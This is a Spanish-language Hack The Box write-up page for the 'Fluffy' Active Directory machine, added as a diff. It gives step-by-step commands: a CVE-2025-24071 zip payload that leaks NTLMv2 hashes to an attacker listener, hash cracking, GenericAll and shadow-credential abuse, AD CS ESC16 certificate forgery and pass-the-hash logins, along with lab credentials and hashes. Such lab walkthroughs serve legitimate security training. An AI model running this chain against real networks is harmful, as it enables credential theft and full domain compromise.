@@ -1,0 +1,160 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Fluffy HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/fluffy/pasted-image-20260305161810.png" alt="Fluffy HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Fluffy</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>BloodHound</span>
+            <span>shadow_credentials</span>
+            <span>esc16</span>
+            <span>Certipy</span>
+            <span>AD CS</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Assumed breach y share con escritura que expone un PDF con CVEs</li>
+            <li><code>Explotación</code>: <a href="https://github.com/Marcejr117/CVE-2025-24071_PoC" target="_blank" rel="noreferrer">CVE-2025-24071</a>. Subir payload al Share con permiso de escritura y capturar <code>hash</code> hash <code>NTLMv2</code> con <code>Responder</code></li>
+            <li><code>Movimiento lateral</code>: Abuso de <code>GenericAll</code> entre usuario y grupo intermedio</li>
+            <li><code>Movimiento lateral</code>: Abuso de <code>GenericAll</code> desde grupo intermedio hacia otros usuarios</li>
+            <li><code>Escalada de Privilegios</code>: Certificados <code>AD CS</code> mediante <code>ESC16</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260304215929.png" alt="Fluffy HTB" />
+          <div class="code-card">
+            <h3>Assumed breach</h3>
+            <pre><code># Credenciales -&gt; j.fleischman:J0elTHEM4n1990!</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar Shares</h3>
+            <pre><code>nxc smb 10.129.17.95 -u &#x27;j.fleischman&#x27; -p &#x27;J0elTHEM4n1990!&#x27; --shares
+# Permiso de escritura en IT</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260305011631.png" alt="Fluffy HTB" />
+          <div class="code-card">
+            <h3>SMB share information leaked</h3>
+            <pre><code>smbclient &#x27;//10.129.17.95/IT&#x27; -U &#x27;j.fleischman%J0elTHEM4n1990!&#x27;
+get Upgrade_Notice.pdf
+# CVE-2025-24071</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260305011540.png" alt="Fluffy HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: <a href="https://github.com/Marcejr117/CVE-2025-24071_PoC" target="_blank" rel="noreferrer">CVE-2025-24071</a></h2>
+          <blockquote>[!INFO] CVE-2025-24071<br />El fallo está en cómo Windows Explorer procesa archivos <code>.library-ms</code> dentro de archivos comprimidos como <code>ZIP</code> o <code>RAR</code><br />Cuando se extrae, si el <code>.library-ms</code> contiene una ruta SMB hacia un servidor atacante se intenta autenticar contra él</blockquote>
+          <p><a href="https://github.com/Marcejr117/CVE-2025-24071_PoC" target="_blank" rel="noreferrer">CVE-2025-24071 PoC GitHub</a></p>
+          <div class="code-card">
+            <h3>Crear.zip con el payload apuntando a nuestro kali</h3>
+            <pre><code>python3 PoC.py payload 10.10.16.130
+# [+] File payload.library-ms created successfully -&gt; exploit.zip</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listener</h3>
+            <pre><code>responder -I tun0</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Subir al share el exploit</h3>
+            <pre><code>smbclient &#x27;//10.129.17.95/IT&#x27; -U &#x27;j.fleischman%J0elTHEM4n1990!&#x27;
+put exploit.zip
+# Esperar a que un usuario descomprima el fichero para capturar su hash NTLMv2</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260305125709.png" alt="Fluffy HTB" />
+          <div class="code-card">
+            <h3>Crackear hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# p.agila:prometheusx-303</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: p.agila <code>GenericAll</code> Service Accounts <code>GenericAll</code> ca_svc</h2>
+          <div class="code-card">
+            <h3>Recolector BloodHound</h3>
+            <pre><code>bloodhound-python -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -ns 10.129.17.95 -d fluffy.htb -c all </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260305131333.png" alt="Fluffy HTB" />
+          <div class="code-card">
+            <h3>Agregarnos al grupo Service Accounts</h3>
+            <pre><code>bloodyAD -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -d fluffy.htb --host 10.129.17.95 add groupMember &#x27;service accounts&#x27; p.agila
+# [+] p.agila added to service accounts</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>ACL Shadow Credentials</h3>
+            <pre><code>certipy-ad shadow auto -username p.agila@fluffy.htb -password &#x27;prometheusx-303&#x27; -account ca_svc
+# [*] Successfully restored the old Key Credentials for &#x27;ca_svc&#x27; 
+# [*] NT hash for &#x27;ca_svc&#x27;: ca0f4f9e9eb8a092addf53bb03fc98c8
+# [*] NT hash for &#x27;winrm_svc&#x27;: 33bd09dcd697600edf6b3a7af4875767</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260305140404.png" alt="Fluffy HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -u &#x27;winrm_svc&#x27; -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: AD CS ESC16</h2>
+          <p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally" target="_blank" rel="noreferrer">ESC16</a></p>
+          <div class="code-card">
+            <h3>Enumerar certificados vulnerables</h3>
+            <pre><code>certipy-ad find -u &#x27;ca_svc&#x27; -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.17.95 -vulnerable</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/fluffy/pasted-image-20260305013347.png" alt="Fluffy HTB" />
+          <div class="code-card">
+            <h3>1. Agregar a la víctima al UPN del Administrador</h3>
+            <pre><code>certipy-ad account -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -dc-ip &#x27;10.129.17.95&#x27; -upn &#x27;administrator&#x27; -user &#x27;ca_svc&#x27; update</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>2. Solicitar certificado.pfx para la víctima con la plantilla por defecto User</h3>
+            <pre><code>certipy-ad req -u &#x27;ca_svc&#x27; -hashes &#x27;ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip &#x27;10.129.17.95&#x27; -target &#x27;dc01.fluffy.htb&#x27; -ca &#x27;fluffy-DC01-CA&#x27; -template &#x27;User&#x27;
+# Obtenemos administrator.pfx</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>3. Revertir el UPN de la cuenta víctima</h3>
+            <pre><code>certipy-ad account  -u &quot;p.agila@fluffy.htb&quot; -p &quot;prometheusx-303&quot; -user ca_svc -upn &#x27;ca_svc@fluffy.htb&#x27; update</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>4. Autenticarnos con administrator.pfx para obtener su hash</h3>
+            <pre><code>certipy-ad auth -pfx administrator.pfx -domain &#x27;fluffy.htb&#x27; -dc-ip 10.129.17.95
+# Hash NTLM Administrator 
+# aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -u &#x27;Administrator&#x27; -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>BloodHound</span>
+            <span>shadow_credentials</span>
+            <span>esc16</span>
+            <span>Certipy</span>
+            <span>AD CS</span>
+            <span>acl</span>
+            <span>Responder</span>
+            <span>ntlmv2</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
